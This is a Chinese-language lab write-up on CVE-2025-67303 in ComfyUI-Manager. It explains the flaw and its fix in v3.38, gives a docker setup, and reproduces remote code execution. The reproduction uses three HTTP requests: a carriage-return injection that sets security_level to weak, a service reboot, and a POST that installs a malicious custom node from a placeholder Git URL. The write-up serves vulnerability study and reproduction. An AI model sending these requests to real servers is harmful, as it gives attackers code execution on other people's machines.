# ComfyUI-Manager远程代码执行漏洞（CVE-2025-67303）

ComfyUI是一款基于节点式工作流的Stable Diffusion专业图形界面，是开源AI绘画领域的核心项目之一。ComfyUI-Manager是ComfyUI的官方扩展管理器，负责管理自定义节点、模型和更新的安装。

在v3.38版本之前，ComfyUI-Manager的数据与配置目录未受Web API访问控制的充分保护。攻击者可以利用`/api/manager/db_mode`接口注入任意配置参数，包括将`security_level`设置为`weak`以禁用安全限制。结合`/api/manager/reboot`接口重启服务和`/api/customnode/install/git_url`接口安装恶意自定义节点，攻击者可以在服务器上实现远程代码执行。该漏洞已在ComfyUI-Manager v3.38版本中通过引入"系统用户保护API"得到修复，所有配置数据被迁移至受保护的目录下。

参考链接：

- <https://mp.weixin.qq.com/s/I1_2E9OyxySwWy0KqQdJXg>

## 环境搭建

执行如下命令启动ComfyUI-Manager 3.37漏洞环境：

```
docker compose up -d
```

服务启动后，访问`http://your-ip:8188`即可看到ComfyUI的界面。

## 漏洞复现

首先，向`/api/manager/db_mode`接口发送请求，将`security_level = weak`配置注入到`config.ini`文件中。Payload中的`%0D`是回车符，用于在配置文件中注入新行：

```
GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak HTTP/1.1
Host: your-ip:8188
```

![](1.png)

然后，向`/api/manager/reboot`接口发送请求来重启ComfyUI服务，使新配置生效：

```
GET /api/manager/reboot HTTP/1.1
Host: your-ip:8188
```

服务器重启后，向`/api/customnode/install/git_url`接口发送POST请求，从Git仓库安装恶意自定义节点。自定义节点中的恶意代码将在安装过程中自动执行：

```
POST /api/customnode/install/git_url HTTP/1.1
Host: your-ip:8188
Content-Type: application/json

{"url": "https://github.com/example/malicious-custom-node"}
```

![](2.png)

恶意自定义节点可以包含任意Python代码，这些代码将以ComfyUI服务器进程的权限执行。
